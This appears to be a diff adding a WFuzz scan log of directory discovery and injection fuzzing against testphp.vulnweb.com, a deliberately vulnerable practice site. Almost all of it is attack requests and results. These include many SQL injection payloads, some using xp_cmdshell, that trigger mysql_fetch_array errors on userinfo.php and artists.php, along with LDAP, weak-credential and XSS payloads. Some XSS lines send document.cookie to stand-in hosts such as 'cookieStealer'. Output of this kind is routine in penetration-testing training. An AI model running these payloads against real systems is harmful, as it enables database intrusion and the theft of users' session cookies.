@@ -1,0 +1,426 @@
+WFuzz -- common directories, URL = http://testphp.vulnweb.com/
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            301            7 L      12      184         None    http://testphp.vulnweb.com/admin
+
+WFuzz -- common files, URL = http://testphp.vulnweb.com/
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200          108 L     384     4903         None    http://testphp.vulnweb.com/cart.php
+        2            200          112 L     400     5390         None    http://testphp.vulnweb.com/guestbook.php
+        3            200           90 L     260     3265         None    http://testphp.vulnweb.com/index.bak
+        4            200            1 L      84     2442         None    http://testphp.vulnweb.com/index.zip
+        5            200          109 L     388     4958         None    http://testphp.vulnweb.com/index.php
+        6            200          119 L     432     5523         None    http://testphp.vulnweb.com/login.php
+        7            200          106 L     377     4830         None    http://testphp.vulnweb.com/logout.php
+        8            302            0 L       0        0         None    http://testphp.vulnweb.com/redir.php
+        9            200          103 L     364     4732         None    http://testphp.vulnweb.com/search.php
+
+Found hidden URLs:
+http://testphp.vulnweb.com/admin/
+http://testphp.vulnweb.com/CVS/
+http://testphp.vulnweb.com/images/
+http://testphp.vulnweb.com/secured/
+http://testphp.vulnweb.com/index.bak
+http://testphp.vulnweb.com/index.zip
+http://testphp.vulnweb.com/logout.php
+http://testphp.vulnweb.com/redir.php
+http://testphp.vulnweb.com/search.php
+
+Perform Fuzzing on the Found URLs....
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          109 L     388     4958         None    http://testphp.vulnweb.com/     searchFor==%20'&goButton==%20'
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/cart.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          108 L     384     4903         None    http://testphp.vulnweb.com/cart.php     searchFor=#&goButton=#
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/disclaimer.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          114 L     463     5524         None    http://testphp.vulnweb.com/disclaimer.php       searchFor=--';&goButton=--';
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/categories.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          116 L     503     6115         None    http://testphp.vulnweb.com/categories.php       searchFor='&goButton='
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/index.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          109 L     388     4958         None    http://testphp.vulnweb.com/index.php    searchFor=--';&goButton=--';
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/artists.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          104 L     386     5328         None    http://testphp.vulnweb.com/artists.php  searchFor==%20'&goButton==%20'
+
+WFuzz -- Weak Username and password, URL = http://testphp.vulnweb.com/login.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          119 L     432     5523         None    http://testphp.vulnweb.com/login.php    uname=123asdf&pass=123asdf
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/login.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          119 L     432     5523         None    http://testphp.vulnweb.com/login.php    uname="&pass="
+        2            200            2 L      33      244         None    http://testphp.vulnweb.com/login.php    uname=\x23&pass=\x23
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/guestbook.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200            2 L      33      244         None    http://testphp.vulnweb.com/guestbook.php        name='&submit=Login
+
+WFuzz -- Weak Username and password, URL = http://testphp.vulnweb.com/userinfo.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200            2 L      33      244         None    http://testphp.vulnweb.com/userinfo.php         uname=&pass=
+        2            302            0 L       3       14         None    http://testphp.vulnweb.com/userinfo.php         uname=web&pass=web
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/userinfo.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            302            0 L       3       14         None    http://testphp.vulnweb.com/userinfo.php         uname='&pass='
+        2            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=--';&pass=--';
+        3            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='%20;&pass='%20;
+        4            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='or%20select *&pass='or%20select *
+        5            200          119 L     447     6068         None    http://testphp.vulnweb.com/userinfo.php         uname='%20--&pass='%20--
+        6            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=\x3D%20\x3B'&pass=\x3D%20\x3B'
+        7            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=<>"'%;)(&+&pass=<>"'%;)(&+
+        8            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=')%20or%20('x'='x&pass=')%20or%20('x'='x
+        9            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=admin'--&pass=admin'--
+       10            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or '1'='1'--&pass=' or '1'='1'--
+       11            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or a=a--&pass=' or a=a--
+       12            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=') or ('a'='a&pass=') or ('a'='a
+       13            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=hi' or 1=1 --&pass=hi' or 1=1 --
+       14            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=hi') or ('a'='a&pass=hi') or ('a'='a
+       15            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='hi' or 'x'='x';&pass='hi' or 'x'='x';
+       16            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or username like '%&pass=' or username like '%
+       17            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or userid like '%&pass=' or userid like '%
+       18            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or uid like '%&pass=' or uid like '%
+       19            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or user like '%&pass=' or user like '%
+       20            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='; exec master..xp_cmdshell&pass='; exec master..xp_cmdshell
+       21            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='; exec xp_regread&pass='; exec xp_regread
+       22            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=t'exec master..xp_cmdshell 'nslookup www.google.com'--&pass=t'exec master..xp_cmdshell 'nslookup www.google.com'--
+       23            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' UNION SELECT&pass=' UNION SELECT
+       24            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' or (EXISTS)&pass=' or (EXISTS)
+       25            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' UNION ALL SELECT&pass=' UNION ALL SELECT
+       26            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=' (select top 1&pass=' (select top 1
+       27            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='||UTL_HTTP.REQUEST&pass='||UTL_HTTP.REQUEST
+       28            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='%20or%201=1&pass='%20or%201=1
+       29            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=%27%20or%201=1&pass=%27%20or%201=1
+       30            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname=%20'sleep%2050'&pass=%20'sleep%2050'
+       31            302            2 L      18      133         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/userinfo.php         uname='sqlattempt1&pass='sqlattempt1
+
+WFuzz -- Weak Username and password, URL = http://testphp.vulnweb.com/login.php/signup.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          119 L     432     5523         None    http://testphp.vulnweb.com/login.php/signup.php         uname=asdf123&pass=asdf123
+
+WFuzz -- SQL Injection on POST parameters, URL = http://testphp.vulnweb.com/login.php/signup.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200          119 L     432     5523         None    http://testphp.vulnweb.com/login.php/signup.php         uname=--&pass=--
+
+WFuzz -- SQL Injection on URL parameters, URL = http://testphp.vulnweb.com/categories.php/listproducts.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200          116 L     503     6115         None    http://testphp.vulnweb.com/categories.php/listproducts.php?cat='
+
+WFuzz -- XSS Injection, URL = http://testphp.vulnweb.com/categories.php/listproducts.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200          116 L     503     6115         None    http://testphp.vulnweb.com/categories.php/listproducts.php?cat=<script>alert(document.cookie)</script>
+
+WFuzz -- SQL Injection on URL parameters, URL = http://testphp.vulnweb.com/hpp/
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200            5 L      16      382         None    http://testphp.vulnweb.com/hpp/?pp='
+        2            200            5 L      18      391         None    http://testphp.vulnweb.com/hpp/?pp='%20--
+        3            200            5 L      18      390         None    http://testphp.vulnweb.com/hpp/?pp='%20;
+        4            200            5 L      16      377         None    http://testphp.vulnweb.com/hpp/?pp=
+        5            200            5 L      16      380         None    http://testphp.vulnweb.com/hpp/?pp=-
+        6            200            5 L      16      383         None    http://testphp.vulnweb.com/hpp/?pp=--
+        7            200            5 L      16      393         None    http://testphp.vulnweb.com/hpp/?pp=--';
+        8            200            5 L      20      448         None    http://testphp.vulnweb.com/hpp/?pp=\x27\x4F\x52%20SELECT%20*
+        9            200            5 L      18      413         None    http://testphp.vulnweb.com/hpp/?pp=\x3D%20\x3B'
+       10            200            5 L      18      408         None    http://testphp.vulnweb.com/hpp/?pp=\x3D%20\x27
+       11            200            5 L      16      403         None    http://testphp.vulnweb.com/hpp/?pp=admin'--
+       12            200            5 L      16      417         None    http://testphp.vulnweb.com/hpp/?pp=<>"'%;)(&+
+       13            200            5 L      16      391         None    http://testphp.vulnweb.com/hpp/?pp=\x23
+       14            200            5 L      20      417         None    http://testphp.vulnweb.com/hpp/?pp='or%20select%20*
+       15            200            5 L      20      414         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20''='
+       16            200            5 L      20      420         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20'x'='x
+       17            200            5 L      20      403         None    http://testphp.vulnweb.com/hpp/?pp=0%20or%201=1
+       18            200            5 L      20      430         None    http://testphp.vulnweb.com/hpp/?pp=')%20or%20('x'='x
+       19            200            5 L      20      406         None    http://testphp.vulnweb.com/hpp/?pp=or%200=0%20--
+       20            200            5 L      22      408         None    http://testphp.vulnweb.com/hpp/?pp='%20or%200=0%20
+       21            200            5 L      22      414         None    http://testphp.vulnweb.com/hpp/?pp="%20or%200=0%20--
+       22            200            5 L      20      400         None    http://testphp.vulnweb.com/hpp/?pp=or%200=0%20
+       23            200            5 L      20      411         None    http://testphp.vulnweb.com/hpp/?pp='%20or%201=1--
+       24            200            5 L      20      431         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20'1'='1'--
+       25            200            5 L      22      421         None    http://testphp.vulnweb.com/hpp/?pp="'%20or%201%20--'"
+       26            200            5 L      18      397         None    http://testphp.vulnweb.com/hpp/?pp=or%201=1
+       27            200            5 L      18      403         None    http://testphp.vulnweb.com/hpp/?pp=or%201=1--
+       28            200            5 L      24      437         None    http://testphp.vulnweb.com/hpp/?pp='%20or%201=1%20or%20''='
+       29            200            5 L      20      426         None    http://testphp.vulnweb.com/hpp/?pp=hi"%20or%20"a"="a
+       30            200            5 L      22      420         None    http://testphp.vulnweb.com/hpp/?pp=hi"%20or%201=1%20--
+       31            200            5 L      20      436         None    http://testphp.vulnweb.com/hpp/?pp=hi')%20or%20('a'='a
+       32            200            5 L      20      441         None    http://testphp.vulnweb.com/hpp/?pp='hi'%20or%20'x'='x';
+       33            200            5 L      16      406         None    http://testphp.vulnweb.com/hpp/?pp=@variable
+       34            200            5 L      16      411         None    http://testphp.vulnweb.com/hpp/?pp=,@variable
+       35            200            5 L      18      429         None    http://testphp.vulnweb.com/hpp/?pp=PRINT%20@@variable
+       36            200            5 L      16      392         None    http://testphp.vulnweb.com/hpp/?pp=PRINT
+       37            200            5 L      16      395         None    http://testphp.vulnweb.com/hpp/?pp=select
+       38            200            5 L      16      404         None    http://testphp.vulnweb.com/hpp/?pp=procedure
+       39            200            5 L      18      401         None    http://testphp.vulnweb.com/hpp/?pp=order%20by
+       40            200            5 L      16      386         None    http://testphp.vulnweb.com/hpp/?pp=asc
+       41            200            5 L      16      389         None    http://testphp.vulnweb.com/hpp/?pp=desc
+       42            200            5 L      16      401         None    http://testphp.vulnweb.com/hpp/?pp=distinct
+       43            200            5 L      16      398         None    http://testphp.vulnweb.com/hpp/?pp=replace
+       44            200            5 L      24      446         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20username%20like%20'%
+       45            200            5 L      24      440         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20userid%20like%20'%
+       46            200            5 L      24      431         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20uid%20like%20'%
+       47            200            5 L      24      434         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20user%20like%20'%
+       48            200            5 L      18      398         None    http://testphp.vulnweb.com/hpp/?pp=exec%20xp
+       49            200            5 L      20      462         None    http://testphp.vulnweb.com/hpp/?pp=';%20exec%20master..xp_cmdshell
+       50            200            5 L      18      427         None    http://testphp.vulnweb.com/hpp/?pp=\x27UNION%20SELECT
+       51            200            5 L      20      435         None    http://testphp.vulnweb.com/hpp/?pp=';%20exec%20xp_regread
+       52            200            5 L      22      545         None    http://testphp.vulnweb.com/hpp/?pp=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'--
+       53            200            5 L      16      416         None    http://testphp.vulnweb.com/hpp/?pp=--sp_password
+       54            200            5 L      20      421         None    http://testphp.vulnweb.com/hpp/?pp='%20UNION%20SELECT
+       55            200            5 L      22      433         None    http://testphp.vulnweb.com/hpp/?pp='%20UNION%20ALL%20SELECT
+       56            200            5 L      20      422         None    http://testphp.vulnweb.com/hpp/?pp='%20or%20(EXISTS)
+       57            200            5 L      22      426         None    http://testphp.vulnweb.com/hpp/?pp='%20(select%20top%201
+       58            200            5 L      16      440         None    http://testphp.vulnweb.com/hpp/?pp='||UTL_HTTP.REQUEST
+       59            200            5 L      18      411         None    http://testphp.vulnweb.com/hpp/?pp=1;SELECT%20*
+       60            200            5 L      20      405         None    http://testphp.vulnweb.com/hpp/?pp='%20or%201=1
+       61            200            5 L      16      422         None    http://testphp.vulnweb.com/hpp/?pp=to_timestamp_tz
+       62            200            5 L      20      419         None    http://testphp.vulnweb.com/hpp/?pp=%20$(sleep%2050)
+       63            200            5 L      16      431         None    http://testphp.vulnweb.com/hpp/?pp=char%4039%41%2b%40SELECT
+       64            200            5 L      16      415         None    http://testphp.vulnweb.com/hpp/?pp='sqlattempt1
+       65            200            5 L      16      420         None    http://testphp.vulnweb.com/hpp/?pp=(sqlattempt2)
+       66            200            5 L      16      387         None    http://testphp.vulnweb.com/hpp/?pp=*|
+       67            200            5 L      16      429         None    http://testphp.vulnweb.com/hpp/?pp=*(|(mail=*))
+       68            200            5 L      16      450         None    http://testphp.vulnweb.com/hpp/?pp=*(|(objectclass=*))
+
+WFuzz -- XSS Injection, URL = http://testphp.vulnweb.com/hpp/
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200            5 L      18      490         None    http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+        2            200            5 L      16      513         None    http://testphp.vulnweb.com/hpp/?pp=%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+        3            200            5 L      16      420         None    http://testphp.vulnweb.com/hpp/?pp="><script>"
+        4            200            5 L      16      508         None    http://testphp.vulnweb.com/hpp/?pp=<script>alert(document.cookie)</script>
+        5            200            5 L      16      510         None    http://testphp.vulnweb.com/hpp/?pp=<<script>alert("WXSS");//<</script>
+        6            200            5 L      16      485         None    http://testphp.vulnweb.com/hpp/?pp=<script>alert("WXSS")</script>
+        7            200            5 L      16      518         None    http://testphp.vulnweb.com/hpp/?pp='><script>alert(document.cookie)</script>
+        8            200            5 L      16      523         None    http://testphp.vulnweb.com/hpp/?pp='><script>alert(document.cookie);</script>
+        9            200            5 L      16      451         None    http://testphp.vulnweb.com/hpp/?pp=\";alert('XSS');//
+       10            200            5 L      16      490         None    http://testphp.vulnweb.com/hpp/?pp=%3cscript%3ealert("WXSS");%3c/script%3e
+       11            200            5 L      16      377         None    http://testphp.vulnweb.com/hpp/?pp=&ltscript&gtalert(document.cookie);</script>
+       12            200            5 L      18      500         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC="javascript:alert('WXSS')"
+       13            200            5 L      18      495         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+       14            200            5 L      18      515         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC=`javascript:alert("'WXSS'")`>
+       15            200            5 L      18      463         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+       16            200            5 L      16      549         None    http://testphp.vulnweb.com/hpp/?pp=<xss><script>alert('WXSS')</script></vulnerable>
+       17            200            5 L      18      528         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC='javascript:alert(document.cookie)'>
+       18            200            5 L      18      510         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC="javascript:alert('WXSS');">
+       19            200            5 L      18      532         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+       20            200            5 L      18      568         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+       21            200            5 L      18      422         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC="jav
+       22            200            5 L      20      416         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC="%20
+       23            200            5 L      18      514         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20LOWSRC="javascript:alert('WXSS')">
+       24            200            5 L      18      619         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+       25            200            5 L      18      408         None    http://testphp.vulnweb.com/hpp/?pp=<IMG%20SRC=
+       26            200            5 L      18      551         None    http://testphp.vulnweb.com/hpp/?pp='%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+       27            200            5 L      18      699         None    http://testphp.vulnweb.com/hpp/?pp=%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+       28            200            5 L      16      432         None    http://testphp.vulnweb.com/hpp/?pp='';!--"<XSS>=&{()}
+       29            200            5 L      16     1182         None    http://testphp.vulnweb.com/hpp/?pp=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+       30            200            5 L      18      694         None    http://testphp.vulnweb.com/hpp/?pp="><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+
+WFuzz -- SQL Injection on URL parameters, URL = http://testphp.vulnweb.com/artists.php/artists.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=
+        2            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='
+        3            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist==%20;
+        4            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=--
+        5            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20--
+        6            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=--';
+        7            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20;
+        8            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="
+        9            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=-
+       10            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist==%20'
+       11            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist==%20--
+       12            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x23
+       13            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x27\x4F\x52%20SELECT%20*
+       14            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x27
+       15            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='or%20select%20*
+       16            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=admin'--
+       17            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x3D%20\x3B'
+       18            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x3D%20\x27
+       19            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x27\x6F\x72%20SELECT%20*
+       20            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<>"'%;)(&+
+       21            200          104 L     364     4735         None    http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20''='
+       22            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20'x'='x
+       23            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=')%20or%20('x'='x
+       24            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="%20or%20"x"="x
+       25            200          123 L     547     6251         None    http://testphp.vulnweb.com/artists.php/artists.php?artist=0%20or%201=1
+       26            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%200=0%20--
+       27            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="%20or%200=0%20--
+       28            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or%200=0%20--
+       29            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="%20or%200=0%20
+       30            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%200=0%20
+       31            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or%200=0%20
+       32            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%201=1--
+       33            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="%20or%201=1--
+       34            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20'1'='1'--
+       35            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or%201=1
+       36            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or%201=1--
+       37            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or%201=1%20--
+       38            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20a=a--
+       39            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="%20or%20"a"="a
+       40            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=')%20or%20('a'='a
+       41            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi"%20or%20"a"="a
+       42            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=")%20or%20("a"="a
+       43            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi'%20or%20'a'='a
+       44            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi'%20or%201=1%20--
+       45            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi')%20or%20('a'='a
+       46            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi"%20or%201=1%20--
+       47            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=hi")%20or%20("a"="a
+       48            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=PRINT
+       49            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=,@variable
+       50            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=PRINT%20@@variable
+       51            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=insert
+       52            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=select
+       53            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=as
+       54            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=procedure
+       55            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=or
